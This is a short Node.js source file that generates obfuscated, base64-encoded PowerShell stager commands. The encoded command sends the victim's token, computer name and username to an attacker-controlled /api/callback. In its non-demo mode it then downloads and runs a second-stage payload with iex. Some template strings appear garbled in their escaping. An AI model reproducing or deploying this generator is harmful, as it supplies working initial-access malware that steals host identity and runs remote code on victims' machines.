const { scramblePowerShell, watermark } = require('./engine');

function generate(token, serverUrl, demo = false) {
    const core = demo
        ? `try{\( u=' \){serverUrl}/api/callback';\( b=@{token=' \){token}';h=$env:COMPUTERNAME;u=$env:USERNAME}|ConvertTo-Json;irm -Uri $u -Method POST -Body $b -ContentType 'application/json';Write-Host 'Houdini was here'}catch{}`
        : `try{\( u=' \){serverUrl}/api/callback';\( b=@{token=' \){token}';h=$env:COMPUTERNAME;u=$env:USERNAME}|ConvertTo-Json;irm -Uri $u -Method POST -Body \( b -ContentType 'application/json';iex (irm ' \){serverUrl}/stage2?token=${token}')}catch{}`;

    const scrambled = scramblePowerShell(core, token);
    const marked = watermark(scrambled, token);

    const buf = Buffer.from(marked, 'utf16le');
    const b64 = buf.toString('base64');

    return `powershell -enc ${b64}`;
}

module.exports = { generate };
